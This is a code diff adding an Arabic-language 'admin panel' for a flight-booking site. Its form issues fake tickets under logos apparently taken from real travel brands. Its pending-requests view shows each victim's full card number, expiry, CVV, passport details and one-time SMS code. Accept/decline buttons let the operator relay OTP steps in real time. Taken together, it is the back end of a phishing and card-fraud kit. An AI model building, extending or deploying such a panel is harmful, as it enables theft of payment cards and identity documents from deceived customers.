@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم المشرف</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+    <style>
+        :root {
+            --booking-blue: #003580;
+            --booking-blue-light: #006ce4;
+            --booking-green: #008009;
+            --booking-red: #e02d4b;
+            --booking-bg: #f0f2f5;
+            --text-primary: #1a1a1a;
+            --text-secondary: #6b6b6b;
+            --border-color: #e0e0e0;
+        }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background-color: var(--booking-bg);
+            color: var(--text-primary);
+        }
+        .input-group { display: flex; flex-direction: column; gap: 0.5rem; }
+        .input-field {
+            width: 100%; border: 1px solid var(--border-color); background-color: white;
+            border-radius: 8px; padding: 0.75rem; font-size: 1rem; transition: border-color 0.2s;
+        }
+        .input-field:focus { outline: none; border-color: var(--booking-blue-light); box-shadow: 0 0 0 2px rgba(0, 108, 228, 0.2); }
+        .input-field:disabled { background-color: #f1f5f9; cursor: not-allowed; }
+        .label { font-weight: 700; font-size: 0.875rem; }
+        .btn-primary {
+            background-color: var(--booking-blue-light); color: white; font-weight: 700;
+            padding: 0.75rem 1.5rem; border-radius: 8px; transition: background-color 0.2s;
+        }
+        .btn-primary:hover { background-color: var(--booking-blue); }
+        .btn-primary:disabled { background-color: #94a3b8; cursor: not-allowed; }
+        .card { background-color: white; border-radius: 12px; padding: 1.5rem; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+        .section-title {
+            font-size: 1.75rem; font-weight: 800; color: var(--text-primary);
+            margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.75rem;
+        }
+        .logo-picker-label {
+            cursor: pointer; border: 2px solid var(--border-color); border-radius: 8px;
+            padding: 1rem; transition: all 0.2s; opacity: 0.7;
+        }
+        .logo-picker-label img { max-height: 40px; object-fit: contain; }
+        .logo-picker-input:checked + .logo-picker-label {
+            border-color: var(--booking-blue-light); opacity: 1;
+            box-shadow: 0 0 0 3px rgba(0, 108, 228, 0.2);
+        }
+        .fade-out { opacity: 0; transition: opacity 0.5s ease; }
+        .checkbox-group { display: flex; align-items: center; gap: 0.75rem; }
+        .checkbox-input { height: 1.25rem; width: 1.25rem; border-radius: 4px; border-color: var(--border-color); text-blue-600; focus:ring-blue-500; }
+    </style>
+</head>
+<body class="p-4 md:p-8">
+
+    <div id="app-container" class="max-w-7xl mx-auto space-y-8">
+        
+        <header class="flex justify-between items-center">
+            <h1 class="text-3xl font-black text-[var(--booking-blue)]">لوحة تحكم المشرف</h1>
+            <div class="flex items-center gap-3">
+                <i class="fas fa-user-shield text-2xl text-[var(--booking-blue)]"></i>
+                <span class="font-bold">Admin</span>
+            </div>
+        </header>
+
+        <main class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            <section class="lg:col-span-2 card space-y-6">
+                <h2 class="section-title"><i class="fas fa-ticket-alt text-[var(--booking-blue-light)]"></i>إنشاء تذكرة جديدة</h2>
+                
+                <form id="ticket-form" class="space-y-6">
+                    <!-- Website Logo & Booking Ref -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="input-group">
+                            <label class="label">اختر شعار الموقع</label>
+                            <div class="flex gap-4">
+                                <input type="radio" name="website_logo" id="logo_almadina" value="almadina" class="sr-only logo-picker-input" checked>
+                                <label for="logo_almadina" class="logo-picker-label flex-1 flex justify-center items-center"><img src="https://res.cloudinary.com/do9agtdqi/image/upload/v1753891488/fde53300-7714-4426-94bf-5a492a932063_s8sztm.jpg" alt="شعار المدينة"></label>
+                                <input type="radio" name="website_logo" id="logo_almosafer" value="almosafer" class="sr-only logo-picker-input">
+                                <label for="logo_almosafer" class="logo-picker-label flex-1 flex justify-center items-center"><img src="https://res.cloudinary.com/do9agtdqi/image/upload/v1753891471/alm-fb-logo-ar_lhbpwv.jpg" alt="شعار المسافر"></label>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="booking_ref" class="label">رقم الحجز / الفاتورة</label>
+                            <input type="text" id="booking_ref" class="input-field" placeholder="اضغط للإنشاء" readonly required>
+                            <button type="button" id="generate-ref-btn" class="text-sm text-[var(--booking-blue-light)] font-bold self-start mt-1">إنشاء رقم جديد</button>
+                        </div>
+                    </div>
+
+                    <!-- Client Name -->
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div class="input-group"><label for="client_firstName" class="label">الاسم الأول للعميل (للعرض)</label><input type="text" id="client_firstName" class="input-field" placeholder="مثال: خالد" required></div>
+                        <div class="input-group"><label for="client_lastName" class="label">اسم العائلة للعميل (للعرض)</label><input type="text" id="client_lastName" class="input-field" placeholder="مثال: الأحمدي" required></div>
+                    </div>
+
+                    <!-- Price & Trip Type -->
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6 items-end">
+                        <div class="input-group"><label for="price" class="label">سعر التذكرة</label><input type="number" id="price" class="input-field" placeholder="مثال: 150" required></div>
+                        <div class="input-group"><label for="currency" class="label">العملة</label><select id="currency" class="input-field"><option value="USD"> دولار أمريكي ($)</option><option value="SAR" selected>ريال سعودي (SAR)</option><option value="JOD">دينار أردني (JOD)</option></select></div>
+                        <div class="input-group"><label class="label">نوع الرحلة</label><select id="trip_type" class="input-field"><option value="one_way">ذهاب فقط</option><option value="round_trip">ذهاب وإياب</option></select></div>
+                    </div>
+
+                    <!-- Flight Details -->
+                    <div class="p-4 border rounded-lg bg-gray-50">
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                            <div class="input-group"><label for="departure_from" class="label">المغادرة من</label><input type="text" id="departure_from" class="input-field" placeholder="مثال: جدة" required></div>
+                            <div class="input-group"><label for="arrival_to" class="label">الوصول إلى</label><input type="text" id="arrival_to" class="input-field" placeholder="مثال: دبي" required></div>
+                        </div>
+                    </div>
+
+                    <!-- Airline & Dates -->
+                    <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                        <div class="input-group">
+                            <label for="airline" class="label">شركة الطيران</label>
+                            <select id="airline" class="input-field" required>
+                                <option value="" disabled selected>اختر شركة طيران</option>
+                                <option value="Saudia">الخطوط السعودية</option>
+                                <option value="Flynas">فلاي ناس</option>
+                                <option value="Flyadeal">طيران أديل</option>
+                                <option value="Emirates">طيران الإمارات</option>
+                                <option value="QatarAirways">الخطوط القطرية</option>
+                                <option value="EgyptAir">مصر للطيران</option>
+                                <option value="TurkishAirlines">الخطوط التركية</option>
+                                <option value="GulfAir">طيران الخليج</option>
+                                <option value="AirArabia">العربية للطيران</option>
+                                <option value="EtihadAirways">الاتحاد للطيران</option>
+                                <option value="RoyalJordanian">الخطوط الأردنية</option>
+                                <option value="KuwaitAirways">الخطوط الكويتية</option>
+                                <option value="BritishAirways">الخطوط البريطانية</option>
+                                <option value="Lufthansa">لوفتهانزا</option>
+                            </select>
+                        </div>
+                        <div class="input-group"><label for="departure_datetime" class="label">تاريخ ووقت المغادرة</label><input type="datetime-local" id="departure_datetime" class="input-field" required></div>
+                        <div class="input-group" id="return-datetime-container"><label for="return_datetime" class="label">تاريخ ووقت العودة</label><input type="datetime-local" id="return_datetime" class="input-field"></div>
+                    </div>
+
+                    <!-- Prefill Passenger Info -->
+                    <div class="pt-4 border-t space-y-4">
+                        <div class="checkbox-group">
+                            <input type="checkbox" id="prefill_info_check" class="checkbox-input">
+                            <label for="prefill_info_check" class="label !mb-0 cursor-pointer">تعبئة معلومات المسافر مسبقاً؟</label>
+                        </div>
+                        <div id="prefill-container" class="hidden space-y-4 p-4 border-l-4 border-blue-500 bg-blue-50">
+                            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                <div class="input-group"><label for="prefill_firstName" class="label">الاسم الأول للمسافر</label><input type="text" id="prefill_firstName" class="input-field"></div>
+                                <div class="input-group"><label for="prefill_lastName" class="label">اسم العائلة للمسافر</label><input type="text" id="prefill_lastName" class="input-field"></div>
+                            </div>
+                            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                                <div class="input-group"><label for="prefill_email" class="label">البريد الإلكتروني</label><input type="email" id="prefill_email" class="input-field"></div>
+                                <div class="input-group"><label for="prefill_passportNumber" class="label">رقم جواز السفر</label><input type="text" id="prefill_passportNumber" class="input-field"></div>
+                                <div class="input-group"><label for="prefill_passportExpiry" class="label">تاريخ انتهاء الجواز</label><input type="date" id="prefill_passportExpiry" class="input-field"></div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="pt-4 border-t"><button type="submit" id="save-ticket-btn" class="btn-primary w-full md:w-auto"><i class="fas fa-save mr-2"></i>حفظ وإنشاء التذكرة</button></div>
+                </form>
+            </section>
+
+            <section class="lg:col-span-1 card">
+                <h2 class="section-title"><i class="fas fa-hourglass-half text-[var(--booking-blue-light)]"></i>طلبات الحجز المعلقة</h2>
+                <div id="pending-requests-container" class="space-y-4 max-h-[80vh] overflow-y-auto p-1">
+                    <p class="text-slate-500 text-center p-4">لا توجد طلبات معلقة حالياً.</p>
+                </div>
+            </section>
+        </main>
+    </div>
+
+    <!-- Modals -->
+    <div id="loadingModal" class="hidden fixed inset-0 bg-black/50 z-50 flex items-center justify-center"><div class="bg-white p-6 rounded-lg shadow-xl flex items-center gap-4"><i class="fas fa-spinner fa-spin text-3xl text-[var(--booking-blue-light)]"></i><span id="loading-message" class="font-bold text-lg">جاري الحفظ...</span></div></div>
+    <div id="resultModal" class="hidden fixed inset-0 bg-black/60 z-50 flex items-center justify-center p-4"><div id="result-modal-content" class="bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center"></div></div>
+
+<script type="module">
+    // Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getFirestore, doc, setDoc, onSnapshot, collection, updateDoc, getDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+
+    // --- Configuration ---
+    const firebaseConfig = {
+        apiKey: "AIzaSyD8De6ejpve1Lj0b5qzXM05v8RYbmNSQUw",
+        authDomain: "booking-e0cc4.firebaseapp.com",
+        projectId: "booking-e0cc4",
+        storageBucket: "booking-e0cc4.appspot.com",
+        messagingSenderId: "666361598120",
+        appId: "1:666361598120:web:8eb42070c3a56dea87b29d"
+    };
+
+    // --- Firebase Initialization ---
+    let db, auth;
+    let unsubscribeFromPendingBookings = null;
+    try {
+        const app = initializeApp(firebaseConfig);
+        db = getFirestore(app);
+        auth = getAuth(app);
+    } catch (error) {
+        console.error("Firebase Initialization Failed:", error);
+        document.body.innerHTML = `<div class="text-center p-8"><h1>فشل تهيئة التطبيق</h1><p>لا يمكن الاتصال بقاعدة البيانات.</p></div>`;
+    }
+
+
+    // --- Authentication ---
+    onAuthStateChanged(auth, (user) => {
+        if (user) {
+            console.log("User is signed in anonymously:", user.uid);
+            startAdminBookingListener(); 
+        } else {
+            signInAnonymously(auth).catch((error) => {
+                console.error("Anonymous sign-in failed:", error);
+                document.body.innerHTML = `<div class="text-center p-8"><h1>فشل المصادقة</h1><p>لا يمكن الاتصال بقاعدة البيانات.</p></div>`;
+            });
+        }
+    });
+
+    // --- DOM Event Listeners ---
+    document.addEventListener('DOMContentLoaded', () => {
+        // DOM Elements
+        const ticketForm = document.getElementById('ticket-form');
+        const saveTicketBtn = document.getElementById('save-ticket-btn');
+        const generateRefBtn = document.getElementById('generate-ref-btn');
+        const bookingRefInput = document.getElementById('booking_ref');
+        const tripTypeSelect = document.getElementById('trip_type');
+        const returnDateContainer = document.getElementById('return-datetime-container');
+        const prefillCheck = document.getElementById('prefill_info_check');
+        const prefillContainer = document.getElementById('prefill-container');
+
+        // Helper functions for modals
+        const showModal = (modalId, message) => {
+            const modal = document.getElementById(modalId);
+            if (modalId === 'loadingModal' && message) document.getElementById('loading-message').textContent = message;
+            modal.classList.remove('hidden');
+        };
+        const hideModal = (modalId) => document.getElementById(modalId).classList.add('hidden');
+        const showResultModal = (title, message, isSuccess) => {
+            const iconClass = isSuccess ? 'fa-check-circle text-green-500' : 'fa-times-circle text-red-500';
+            document.getElementById('result-modal-content').innerHTML = `<i class="fas ${iconClass} text-7xl mb-4"></i><h3 class="text-2xl font-bold mb-2">${title}</h3><p class="text-slate-600 mb-6">${message}</p><button onclick="document.getElementById('resultModal').classList.add('hidden')" class="btn-primary w-full">حسنًا</button>`;
+            showModal('resultModal');
+        };
+        
+        const generateBookingRef = () => `BK-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
+
+        // Event Listeners
+        generateRefBtn.addEventListener('click', () => bookingRefInput.value = generateBookingRef());
+        prefillCheck.addEventListener('change', () => prefillContainer.classList.toggle('hidden', !prefillCheck.checked));
+        tripTypeSelect.addEventListener('change', () => {
+            const isRoundTrip = tripTypeSelect.value === 'round_trip';
+            returnDateContainer.style.display = isRoundTrip ? 'flex' : 'none';
+            if(isRoundTrip) {
+                document.getElementById('return_datetime').required = true;
+            } else {
+                document.getElementById('return_datetime').required = false;
+            }
+        });
+        tripTypeSelect.dispatchEvent(new Event('change'));
+
+
+        // Form Submission
+        ticketForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            saveTicketBtn.disabled = true;
+            showModal('loadingModal', 'جاري حفظ التذكرة...');
+
+            const bookingRef = bookingRefInput.value;
+            if (!bookingRef) {
+                hideModal('loadingModal');
+                saveTicketBtn.disabled = false;
+                showResultModal('خطأ', 'الرجاء إنشاء رقم حجز أولاً.', false);
+                return;
+            }
+
+            const airlineSelect = document.getElementById('airline');
+            const ticketData = {
+                booking_ref: bookingRef,
+                website_logo: document.querySelector('input[name="website_logo"]:checked').value,
+                client_firstName: document.getElementById('client_firstName').value,
+                client_lastName: document.getElementById('client_lastName').value,
+                price: parseFloat(document.getElementById('price').value) || 0,
+                currency: document.getElementById('currency').value,
+                trip_type: document.getElementById('trip_type').value,
+                departure_from: document.getElementById('departure_from').value,
+                arrival_to: document.getElementById('arrival_to').value,
+                airline_name: airlineSelect.options[airlineSelect.selectedIndex].text,
+                airline_logo_path: `https://logo.clearbit.com/${airlineSelect.value.toLowerCase().replace(/\s/g, '')}.com`,
+                departure_datetime: document.getElementById('departure_datetime').value,
+                return_datetime: document.getElementById('return_datetime').value || null,
+                createdAt: new Date().toISOString(),
+                prefilled_client_data: null
+            };
+
+            if (prefillCheck.checked) {
+                ticketData.prefilled_client_data = {
+                    firstName: document.getElementById('prefill_firstName').value,
+                    lastName: document.getElementById('prefill_lastName').value,
+                    user_email: document.getElementById('prefill_email').value,
+                    passportNumber: document.getElementById('prefill_passportNumber').value,
+                    passportExpiry: document.getElementById('prefill_passportExpiry').value,
+                };
+            }
+
+            try {
+                const docRef = doc(db, `artifacts/${firebaseConfig.appId}/public/data/flight_tickets`, ticketData.booking_ref);
+                await setDoc(docRef, ticketData);
+                hideModal('loadingModal');
+                showResultModal('نجاح!', `تم إنشاء التذكرة بنجاح. رقم الحجز: ${ticketData.booking_ref}`, true);
+                ticketForm.reset();
+                bookingRefInput.value = '';
+                prefillContainer.classList.add('hidden');
+                tripTypeSelect.dispatchEvent(new Event('change'));
+            } catch (error) {
+                console.error("Error saving ticket: ", error);
+                hideModal('loadingModal');
+                showResultModal('خطأ', 'فشل حفظ التذكرة. تحقق من Console.', false);
+            } finally {
+                saveTicketBtn.disabled = false;
+            }
+        });
+    });
+
+    // --- Firestore Listener for Pending Requests ---
+    function startAdminBookingListener() {
+        if (unsubscribeFromPendingBookings || !db) return; 
+        const pendingCollectionRef = collection(db, `artifacts/${firebaseConfig.appId}/public/data/pending_bookings`);
+        
+        unsubscribeFromPendingBookings = onSnapshot(pendingCollectionRef, (snapshot) => {
+            const requests = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+            renderPendingRequests(requests);
+        }, (error) => {
+            console.error("Snapshot listener error:", error);
+            document.getElementById('pending-requests-container').innerHTML = `<p class="text-red-500 text-center p-4"><b>خطأ في الوصول:</b> لم نتمكن من قراءة الطلبات.</p>`;
+        });
+    }
+    
+    function renderPendingRequests(requests) {
+        const container = document.getElementById('pending-requests-container');
+        // Filter out confirmed bookings so they disappear from the admin's pending list
+        const pendingOnly = requests.filter(req => req.status !== 'confirmed');
+
+        if (!pendingOnly || pendingOnly.length === 0) {
+            container.innerHTML = `<p class="text-slate-500 text-center p-4">لا توجد طلبات معلقة حالياً.</p>`;
+            return;
+        }
+        container.innerHTML = pendingOnly.map(req => {
+            if (!req.bookingDetails) return '';
+            const details = req.bookingDetails;
+            const priceText = `${(details.calculatedPrice || 0).toFixed(2)} ${details.currency || 'SAR'}`;
+
+            let statusHtml = '';
+            switch(req.status) {
+                case 'payment_pending': statusHtml = `<span class="font-bold text-yellow-600">انتظار تأكيد الدفع</span>`; break;
+                case 'otp_submitted': statusHtml = `<span class="font-bold text-blue-600">انتظار تأكيد الرمز</span>`; break;
+                case 'otp_declined': statusHtml = `<span class="font-bold text-red-500">تم رفض الرمز</span>`; break;
+                default: statusHtml = `<span class="font-bold text-gray-500">${req.status}</span>`;
+            }
+            
+            return `<div class="bg-slate-50 p-4 rounded-lg border" id="request-${req.id}">
+                <div class="flex justify-between items-start mb-3">
+                    <div>
+                        <p class="font-bold">${details.firstName || ''} ${details.lastName || ''}</p>
+                        <p class="text-sm text-slate-600">مرجع: ${req.ticketId || 'N/A'}</p>
+                    </div>
+                    <p class="font-bold text-lg text-[var(--booking-blue)]">${priceText}</p>
+                </div>
+                <div class="bg-white p-2 rounded text-sm space-y-1 mb-3 text-right">
+                    <p><strong>البريد:</strong> ${details.user_email || 'N/A'}</p>
+                    <p><strong>الجواز:</strong> ${details.passportNumber || 'N/A'} | <strong>انتهاء:</strong> ${details.passportExpiry || 'N/A'}</p>
+                    <p><strong>البطاقة:</strong> <span dir="ltr">${details.cardNumber || 'N/A'}</span></p>
+                    <p><strong>الانتهاء:</strong> ${details.expiry || 'N/A'} | <strong>CVV:</strong> ${details.cvv || 'N/A'}</p>
+                    ${req.otpCode ? `<p class="font-bold text-red-600"><strong>رمز التحقق:</strong> ${req.otpCode}</p>` : ''}
+                </div>
+                <div class="flex justify-between items-center">
+                    <div class="text-sm">${statusHtml}</div>
+                    <div class="flex gap-2">
+                        <button data-action="admin-decline" data-doc-id="${req.id}" class="bg-red-600 text-white font-bold py-1 px-4 rounded-md text-sm">رفض</button>
+                        <button data-action="admin-accept" data-doc-id="${req.id}" class="bg-green-600 text-white font-bold py-1 px-4 rounded-md text-sm">قبول</button>
+                    </div>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    // --- Handle Admin Actions (Accept/Decline) ---
+    document.getElementById('pending-requests-container').addEventListener('click', async (e) => {
+        const button = e.target.closest('[data-action]');
+        if (!button) return;
+
+        const { action, docId } = button.dataset;
+        const card = document.getElementById(`request-${docId}`);
+        if (card) {
+            card.style.opacity = '0.5';
+            card.querySelectorAll('button').forEach(b => b.disabled = true);
+        }
+        
+        const docRef = doc(db, `artifacts/${firebaseConfig.appId}/public/data/pending_bookings`, docId);
+
+        try {
+            if (action === 'admin-decline') {
+                // On any decline, delete the document from Firestore.
+                await deleteDoc(docRef);
+                // The onSnapshot listener on both client and admin will handle the UI update.
+            } else if (action === 'admin-accept') {
+                const docSnap = await getDoc(docRef);
+                if (!docSnap.exists()) return;
+                
+                const currentStatus = docSnap.data().status;
+                let newStatus = '';
+
+                if (currentStatus === 'payment_pending' || currentStatus === 'otp_declined') {
+                    // Accept payment, ask for OTP
+                    newStatus = 'otp_pending';
+                } else if (currentStatus === 'otp_submitted') {
+                    // Accept OTP, confirm booking
+                    newStatus = 'confirmed';
+                }
+
+                if (newStatus) {
+                    await updateDoc(docRef, { status: newStatus });
+                }
+                
+                // If the process is not finished (i.e., we just asked for OTP), re-enable the card.
+                if (newStatus !== 'confirmed' && card) {
+                    card.style.opacity = '1';
+                    card.querySelectorAll('button').forEach(b => b.disabled = false);
+                }
+            }
+        } catch (err) {
+            console.error("Error handling admin action: ", err);
+            if (card) { // Restore card on error
+                card.style.opacity = '1';
+                card.querySelectorAll('button').forEach(b => b.disabled = false);
+            }
+        }
+    });
+</script>
+</body>
+</html>
